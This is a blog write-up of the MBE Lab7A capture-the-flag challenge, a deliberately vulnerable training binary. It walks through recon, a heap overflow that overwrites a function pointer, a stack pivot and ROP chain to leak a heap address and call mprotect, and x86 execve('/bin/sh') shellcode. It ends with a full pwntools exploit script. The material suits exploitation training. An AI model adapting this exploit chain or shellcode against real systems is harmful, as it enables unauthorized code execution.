---
layout: post
title:  "MBE Lab7A Writeup"
---

## Introduction
In this article I will summaries how I solved MBE Lab7A CTF Challenge.

## Writeup
The challenge starts with a standard ELF binary named lab7A.
The goal is to achieve arbitrary code execution through the given executable, communication with the binary is done through TCP port 7741.
When I run `ps -aux` on the machine, I spot the line:

```sh
gameadmin@warzone:/levels/lab07$ ps -aux
root       876  0.0  0.1   5076  2568 ?        S    May20   0:00 socat TCP-LISTEN:7741,reuseaddr,fork,su=lab7end EXEC:timeout 60 /levels/lab07/lab7A
```

I can see that it is socat listening on 7741 and executing the binary on connection, relaying stdin, stderr and stdout to it.
I take a look at the binary using the `file` command:

```sh
gameadmin@warzone:/levels/lab07$ file ./lab7A
./lab7A: ELF 32-bit LSB  executable, Intel 80386, version 1 (GNU/Linux), statically linked, for GNU/Linux 2.6.24, BuildID[sha1]=012755711d7f7507275c0340e52d3a5a2da28388, not stripped
```

The file is a 32-bit ELF, statically linked not stripped of symbols.
Check for mitigations using `checksec`:

```sh
gameadmin@warzone:/levels/lab07$ checksec ./lab7A
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FORTIFY FORTIFIED FORTIFY-able  FILE
Partial RELRO   Canary found      NX enabled    No PIE          No RPATH   No RUNPATH   Yes     2               42      ./lab7A
```

In total the memory mitigations are
* Partial RELRO
* Stack Canaries
* NX bit on the stack
* No PIE - Which is good, as I know that ASLR is turned on, atleast the address space of the ELF image will remain constant.

When I connect to port 7741 I get a nice choice menu:

```sh
root@warzone:/levels/lab07
# nc localhost 7741
+---------------------------------------+
|        Doom's OTP Service v1.0        |
+---------------------------------------+
|------------ Services Menu ------------|
|---------------------------------------|
| 1. Create secure message              |
| 2. Edit secure message                |
| 3. Destroy secure message             |
| 4. Print message details              |
| 5. Quit                               |
+---------------------------------------+
Enter Choice:
```

I can see this is some kind of message managing system. Opening the binary in IDA I started to analyze the binary statically, looking at the different functions. Looking at the `create_message` function I saw the message struct is being allocated and manipulated on the heap:<br/>

![createMessageDecompile](/assets/img/create_message_decompile.png)

So I reversed the message struct using [HexReyPyTools](https://github.com/igogo-x86/HexRaysPyTools) scan function, scanning every offset access of the variable, and came up with the following struct:<br/>

![messageStruct.png](/assets/img/message_struct.png)

I spotted a buffer-overflow at the message creation code, with the dataLength input of 131, one can overflow the message buffer by 3 bytes, influencing the 3 MSB bytes of dataLength.<br/>

![vulnerabilityDesc](/assets/img/vulnerability_desc.png)

Combining this vulnerability with the edit message function, I can overflow the dataBuffer using the edited dataLength.<br/>

![editMessage](/assets/img/edit_message.png)


Looking at the message struct:

```sh
struct Message_st
{
  void (__cdecl *printFunction)(Message_st *msg);
  _DWORD randomsArray[32];
  _BYTE dataBuffer[128];
  _DWORD dataLength;
};
```

there is a function pointer member, which is called at the `print_index` function triggered by choice number 4:<br/>

![eipControlPrintIndex](/assets/img/eip_control_print_index.png)

By creating a second message object, which will be placed right after the first one on the heap, I can utilize the buffer-overflow primitive to change its printFunction value and use the `print_index` functionality to get arbitrary EIP control!
When overflowing data on the heap I needed to take into account the heap implementation for the machine, which is ptmalloc2, because it influences the heap structure.
The overflow looks like this:<br/>

![buffoHeapStruct](/assets/img/buffo_heap_struct.png)

Just for the sake of testing I gave this a quick try and managed to segfault:<br/>

![firstSegfault](/assets/img/first_segfault.png)

Because the binary is statically linked and in addition its not position independent, I started looking for interesting functions to execute like `system`, all the forms of the `exec` function and so on, but ended up empty handed.
The other option I came up with was to execute my own shellcode. Only 1 problem the stack is non executable because of the NX bit and so is the heap.
And then I saw that `mprotect` is statically linked to the binary. If I can call it with a HEAP address I will be able to execute shellcode on the heap.
`mprotect` signature:

```c
int mprotect(void *addr, size_t len, int prot);
```

* addr - an address on the heap, must be page aligned
* len - the amount of memory to change its permission, will be aligned to page size.
* prot - the permission for the pages, we are interested in PROT_READ | PROT_WRITE | PROT_EXEC

However, because of ASLR, I need to leak a heap address. printf is linked into the binary so I can call it. Unfortunately I cannot control the arguments passed to printf which is `globalMessageArray[msgIndex]`, what I can do however is utilize the EIP overwrite to jump to somewhere within the binary which will set ESP to somewhere I do have control over the stack content (aka stack pivoting) and then ROP to printf and pass the address of globalMessageArray, which is located on the .data section, that points to a Message0’s address on the heap.

Taking a look at the `print_index` function, I saw they are using `fgets` to fetch the message index to print, with a 32 byte size! thats alot when there is a 10 size limit for the messages array. But its good for me :sunglasses:. Passing `"1\x00<30 control bytes>"` to `fgets` will result with `strtoul` evaluating it to 1 and I will still have control over 30 bytes on the stack.
Using [ROPgadget.py](https://github.com/JonathanSalwan/ROPgadget) I found the following ropchain:

```asm
;.text:0807E4D2:
add esp, 0x20
mov eax, esi 
pop ebx 
pop esi 
ret
```

Which was perfect, I was able to add 40 to esp, call printf to leak a heap address and return execution to main:<br/>

![ropGadget](/assets/img/rop_gadget.png)

This is actually a great gadget, by replacing `printf` with any function address I want, I can call any function with arbitrary arguments.
So I also utilized this ROP to call `mprotect` to make the heap executable:<br/>

![heapRWXP](/assets/img/heap_rwxp.png)

Now I just need to execute shellcode on the heap.
I created a short shellcode using x86 assembly that executes "/bin/sh":

```asm
global _func

; shellcode entry
_func:  
    ; call execve - run /bin/sh
    mov DWORD [esp+0xc], 0x6e69622f
    mov DWORD [esp+0x10], 0x0068732f
    mov eax, 0xb ; execve syscall number
    lea ebx, [esp+0xc] ; /bin/sh string
    mov ecx, 0x00 ; NULL - argv
    mov edx, 0x00 ; NULL - envp
    int 0x80
```

I chose the secondMessage->randomsArray to be a good area to place my shellcode, being able to calculate its address by adding the offset to the leaked heap address and later calling it using the arbitrary EIP control primitive.
Chaining it all together to get code execution:<br/>

![finalCodeExecution](/assets/img/final_code_execution.png)

Done 😁.

I have added the exploitation code for reference:

```python
from pwn import remote, p32, pack, u32, u8, tube
from pwn import log as pwnlog

REMOTE_ADDR = "192.168.56.102"
REMOTE_PORT = 7741
SHELLCODE_FILE = "sc.bin"
PAGE_SIZE = 4096
MAIN_ADDR = 0x08049569
PRINTF_ADDR = 0x8050260
MPROTECT_ADDR = 0x806f410
STACK_PIVOT_GADGET_ADDR = 0x0807E4D2
GLOBAL_MESSAGES_ARRAY_ADDR = 0x080EEF60
PROT_READ = 0x1
PROT_WRITE = 0x2
PROT_EXEC = 0x4
PROT_NONE = 0x0

pwnlog.setLevel("INFO")


class Lab7AExploit(object):
    def __init__(self, remote_address, remote_port):
        self._tube = remote(remote_address, remote_port, "ipv4", typ="tcp")
        pwnlog.debug(self._tube.recv().decode('utf-8'))

    @staticmethod
    def with_crlf(data):
        return data if data.endswith(b"\r\n") else data + b"\r\n"

    @staticmethod
    def to_fgets(data, max_len):
        return Lab7AExploit.with_crlf(data) if len(data) < max_len - 1 else data

    def send(self, data):
        self._tube.send(data)

    def send_and_receive(self, data, num=4096, timeout=tube.default):
        self._tube.send(data)
        return self._tube.recv(num, timeout=timeout)

    def __enter__(self):
        pwnlog.progress("Exploiting Lab7A")
        return self

    def __exit__(self, type_, value, traceback):
        self.quit()
        self._tube.close()

    def create_message(self, data_length, data):
        resp = bytes()

        pwnlog.progress("Creating message")
        resp += self.send_and_receive(b"1\r\n")
        resp += self.send_and_receive(self.with_crlf(data_length))
        resp += self.send_and_receive(data)
        return resp

    def edit_message(self, message_index, new_data):
        resp = bytes()

        pwnlog.progress("Editing message")
        resp += self.send_and_receive(b"2\r\n")
        resp += self.send_and_receive(self.to_fgets(message_index, 32))
        resp += self.send_and_receive(new_data)
        return resp

    def print_index(self, message_index):
        resp = bytes()

        pwnlog.progress("Printing index")
        resp += self.send_and_receive(b"4\r\n")
        resp += self.send_and_receive(self.to_fgets(message_index, 32))
        return resp

    def quit(self):
        resp = bytes()

        pwnlog.progress("Quitting")
        resp += self.send_and_receive(b"5\r\n", timeout=1)
        return resp


    def extract_leaked_address(response):
        stamp = b"Input message index to print: "
        start = response.find(stamp) + len(stamp)
        end = response.find(stamp) + len(stamp) + 4
        return u32(response[start:end])


def exploit():
    with Lab7AExploit(REMOTE_ADDR, REMOTE_PORT) as lab7a_exploit:
        try:
            lab7a_exploit.create_message(b"131", (b"A" * 128) + pack(0x90, 24))
            lab7a_exploit.create_message(b"128", b"B" * 128)
            lab7a_exploit.edit_message(b"0", (b"A" * 128) + p32(0x110) + p32(264) + p32(264) + p32(STACK_PIVOT_GADGET_ADDR))

            # Info leak
            response = lab7a_exploit.print_index(
                b"1\x00" + b"A" * 6 + p32(PRINTF_ADDR) + p32(MAIN_ADDR) + p32(GLOBAL_MESSAGES_ARRAY_ADDR))
            leaked_heap_address = extract_leaked_address(response)
            pwnlog.success("Leaked 0x%x" % leaked_heap_address)


            # Make heap executable
            pwnlog.info("Making heap executable")
            lab7a_exploit.print_index(
                b"1\x00" + b"A" * 6 + p32(MPROTECT_ADDR) + p32(MAIN_ADDR) + p32(leaked_heap_address & -PAGE_SIZE) +
                p32(PAGE_SIZE) + p32(PROT_WRITE | PROT_READ | PROT_EXEC))
            shellcode_address = leaked_heap_address + 276

            # Prepare shellcode for execution
            with open(SHELLCODE_FILE, "rb") as _shellcode_f:
                shellcode = _shellcode_f.read()
                pwnlog.info("Writing shellcode to heap")
                lab7a_exploit.edit_message(b"0",(b"A" * 128) + p32(0x110) + p32(264) + p32(1)   + p32(shellcode_address) + shellcode + (b"A" * (128 - len(shellcode))))


            # Call shellcode
            pwnlog.info("Executing shellcode")
            lab7a_exploit.send_and_receive(b"4\r\n")
            lab7a_exploit.send(b"1\r\n")
            while 1:
                in_ = bytes(input("> ") + "\n", "utf-8")
                if in_ == b"-1\n":
                    break
                print(lab7a_exploit.send_and_receive(in_, timeout=1))

        except EOFError:
            pwnlog.warning("Process tube closed unexpectedly")
        except KeyboardInterrupt:
            pwnlog.warning("Keyboard-Interrupt, exiting.")


if __name__ == "__main__":
    exploit()
```